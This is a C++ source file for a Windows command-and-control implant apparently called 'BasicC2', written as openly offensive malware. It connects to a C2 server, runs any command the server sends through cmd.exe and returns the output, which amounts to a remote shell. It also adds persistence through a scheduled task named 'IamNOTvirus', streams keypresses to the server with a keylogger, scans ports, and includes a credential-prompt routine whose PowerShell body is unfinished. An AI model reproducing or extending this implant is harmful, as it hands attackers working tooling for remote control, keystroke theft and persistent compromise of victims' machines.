#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0500

#include <iostream>
#include <fstream>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <sstream>
#include <chrono>
#include <thread>


using namespace std;

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


// <NETWORK FUNCTIONS>


// Init socket connection with server.
SOCKET initSocket(string serverAddr, string port)
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    int iResult;

    struct addrinfo* result = NULL, * ptr = NULL, hints;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        cout << "[!] WSAStartup failed with error: " << iResult << endl;
        return 1;
    }

    // Initialize Winsock
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(serverAddr.c_str(), port.c_str(), &hints, &result);
    if (iResult != 0) {
        cout << "[!] getaddrinfo failed with error: " << iResult << endl;
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            cout << "[!] socket failed with error: " << WSAGetLastError() << endl;
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    return ConnectSocket;
}

// Sending message to server.
int sendMsg(SOCKET ConnectSocket, string msg)
{
    int iResult;

    iResult = send(ConnectSocket, msg.c_str(), msg.length(), 0);
    if (iResult == SOCKET_ERROR) {
        cout << "[!] connection read error: " << WSAGetLastError() << endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    return iResult;
}

// Blocking function waiting for message from server.
string getMsg(SOCKET ConnectSocket)
{
    string out;

    char recvbuf[1024];
    int iResult;
    int recvbuflen = 1024;

    iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);

    if (iResult > 0)
    {
        // terminate string
        recvbuf[iResult] = '\0';
        out = string(recvbuf).substr(0, iResult);
    }
    else
    {
        out = "-FAIL-";
    }

    return out;
}


// </NETWORK FUNCTIONS>


// <HELPING FUNCTIONS>


// Execute command in cmd.exe in parameter and return command output.
string exec(string cmdStr) {
    char buffer[128];
    string result = "";
    const char* cmd;

    // forward all error output to standart output
    cmdStr = cmdStr + "  2>&1";
    cmd = cmdStr.c_str();

    FILE* pipe = _popen(cmd, "r");

    if (!pipe) throw runtime_error("[!] exec fail: popen() failed!");

    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);

    return result;
}

vector<string> splitStr(string str, char delim)
{
    string word;
    vector<string> words{};
    stringstream sstream(str);

    while (getline(sstream, word, delim)) {
        words.push_back(word);
    }
    return words;
}
// Get system path of actually running exe.
string getActualExePath()
{
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return string(buffer);
}


string describeKey(int keyCode) {
    string out = "";

    switch (keyCode) {
    case VK_SPACE:
        return "<SPACE>";
    case VK_RETURN:
        return "<ENTER>";
    case VK_SHIFT:
        return "<SHIFT>";
    case VK_BACK:
        return "<BACK>";
    case VK_RBUTTON:
        return "<R_CLICK>";
    case VK_CAPITAL:
        return "<CAPS_LOCK>";
    case VK_TAB:
        return "<TAB>";
    case VK_UP:
        return "<UP>";
    case VK_DOWN:
        return "<DOWN>";
    case VK_LEFT:
        return "<LEFT>";
    case VK_RIGHT:
        return "<RIGHT>";
    case VK_CONTROL:
        return "<CONTROL>";
    case VK_MENU:
        return "<ALT>";
    default:
        out += char(keyCode);
        return out;
    }
}


// </HELPING FUNCTIONS>


// <UTILS FUNCTIONS>


// Check whether persistence is needed. If so, create it.
string utilPersistance()
{
    string cmdOut;
    string cmd;
    string exeFileLocation = getActualExePath();
    string serviceName = "IamNOTvirus";


    // firstly check whether this service is not created already
    cmd = "schtasks /query 2>&1";
    cmdOut = exec(cmd);
    if (cmdOut.find(serviceName) == std::string::npos)
    {
        exeFileLocation = getActualExePath();
        string cmd = "schtasks /create /sc minute /mo 1 /tn \"" + serviceName + "\" /tr \"" + exeFileLocation + "\"";
        cmdOut = exec(cmd);
    }
    else
    {
        cmdOut = "No need to create new task, scheduled task with name " + serviceName + " is already created.";
    }

    return cmdOut;
}

// show UI 
string utilShowCredentialsPrompt()
{
    string tmpFilePath = "C:\\ProgramData\\test.ps1";
    string cmdOut;
    ofstream out(tmpFilePath);

    out << "TBD: powershell GUI credentails capture line 1" << endl;
    out << "TBD: powershell GUI credentails capture line 2" << endl;
    out << "..." << endl;

    out.close();

    cmdOut = exec("powershell -ExecutionPolicy Bypass "+tmpFilePath);

    remove(tmpFilePath.c_str());

    return cmdOut;
}

string utilScan(string command)
{
    string addr;
    string portStr;

    vector<string> words{};
    words = splitStr(command, ' ');
   
    // check syntax "!scan ADDR PORT"
    if (words.size() == 3) 
    {
        string output;
        SOCKET ConnectSocket;
        // reading address
        string addr = words[1];
        // reading port
        string port = words[2];

        //TODO: allow scanning for multiple ports with syntax: PORT1,PORT2,...
        
        ConnectSocket = initSocket(addr, port);

        if (ConnectSocket == 1)
        {
            output = addr + ":" + port + " is closed";
        }
        else 
        {
            output = addr + ":" + port + " is open";
        }

        return output;
    }
    else 
    {
        // syntax check failed
        return "ERR, syntax: !scan IP PORT";
    }
}

void utilKeyloggerInit(SOCKET ConnectSocket, string cmd)
{
    char KEY = ' ';
    string prompt = "\n> ";
    string msgOut;

    vector<string> words{};
    words = splitStr(cmd, ' ');

    // check syntax "!keylog"
    if (words.size() == 1)
    {
        sendMsg(ConnectSocket, "KEYLOGGER MESSAGES (will run forever):");
        
        //TODO: in while condition change true for check of time
        while (true) {
            Sleep(0.1);
            for (int KEY = 8; KEY <= 190; KEY++)
            {
                if (GetAsyncKeyState(KEY) == -32767) 
                {
                    if (KEY < 150)
                    {
                        msgOut = "\n- KEYPRESS:" + describeKey(KEY);
                        sendMsg(ConnectSocket, msgOut);
                    }
                }
            }
        }
        
        sendMsg(ConnectSocket, "\nKEYLOGGER WAS ENDED." + prompt);
    }
    else
    {
        // syntax check failed
        sendMsg(ConnectSocket, "ERR, syntax: !keylog" + prompt);
    }
}


// </UTILS FUNCTIONS>


int __cdecl main(int argc, char** argv)
{
    int iResult;
    string cmd;
    string cmdOut;
    SOCKET ConnectSocket;

    string serverAddr = "localhost";
    string serverPort = "8080";
    string prompt = "\n> ";

    cout << "[i] BasicC2 started" << endl;

    cout << "[i] trying to contact C2 server " << serverAddr << ":" << serverPort << endl;
    ConnectSocket = initSocket(serverAddr, serverPort);

    if (ConnectSocket == 1)
    {
        cout << "[!] unable to connect to C2 server, quitting" << endl;
        return 1;
    }

    cout << "[i] sending initial message to C2 server" << endl;
    // Send an initial message
    sendMsg(ConnectSocket, "\nHello master, I am your BasicC2.\n" + prompt);

    cout << "[i] waiting for commands from server" << endl;

    // main functional loop
    while (true)
    {
        cmd = getMsg(ConnectSocket);
        cout << "[i] recieved command from server: " << cmd;
        
        // removing newlines from cmd
        cmd.erase(remove(cmd.begin(), cmd.end(), '\n'), cmd.end());

        // decide what to do with cmd from server
        if (cmd == "-FAIL-")
        {
            cout << "[!] connection not valid anymore, time to quit" << endl;
            break;
        }
        else if (cmd.find("!prompt") != std::string::npos)
        {
            cmdOut = utilShowCredentialsPrompt();
            sendMsg(ConnectSocket, "CREDS RECIEVED: "+ cmdOut + prompt);
        }
        else if (cmd.find("!persist") != std::string::npos)
        {
            cmdOut = utilPersistance();
            sendMsg(ConnectSocket, "PERSISTANCE OUTPUT:\n " + cmdOut + prompt);
        }
        else if (cmd.find("!keylog") != std::string::npos)
        {
            utilKeyloggerInit(ConnectSocket, cmd);   
        }
        else if (cmd.find("!scan") != std::string::npos)
        {
            cmdOut = utilScan(cmd);
            sendMsg(ConnectSocket, cmdOut + prompt);
        }
        else if (cmd.find("!exit") != std::string::npos)
        {
            sendMsg(ConnectSocket, "quitting...");
            break;
        }
        else
        {
            cmdOut = exec(cmd);
            sendMsg(ConnectSocket, cmdOut + prompt);
            cout << "[i] sending command output to server" << endl;
        }
    }

    cout << "[i] cleanup and quit" << endl;

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}